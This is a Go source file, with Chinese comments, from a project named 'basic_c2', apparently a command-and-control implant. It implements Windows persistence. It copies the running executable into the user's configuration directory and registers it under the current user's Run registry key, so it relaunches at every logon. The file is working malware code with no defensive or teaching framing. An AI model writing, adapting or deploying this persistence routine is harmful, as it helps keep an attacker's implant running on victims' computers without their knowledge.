//go:build windows
// +build windows

package persistence

import (
	"os"
	"path/filepath"
	"strings"

	"basic_c2/internal/config"
	"golang.org/x/sys/windows/registry"
)

// installImpl 实现持久化：复制到用户目录并添加注册表自启动
func installImpl() error {
	// 获取当前可执行文件路径
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	// 获取用户配置目录
	configDir, err := os.UserConfigDir()
	if err != nil {
		return err
	}

	// 目标路径
	destPath := filepath.Join(configDir, config.ExeName)

	// 如果已经在目标位置，跳过复制
	if strings.EqualFold(exePath, destPath) {
		return nil
	}

	// 复制文件
	input, err := os.ReadFile(exePath)
	if err != nil {
		return err
	}
	
	err = os.WriteFile(destPath, input, 0777)
	if err != nil {
		return err
	}

	// 添加到注册表自启动
	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k.Close()

	return k.SetStringValue(config.AppName, destPath)
}
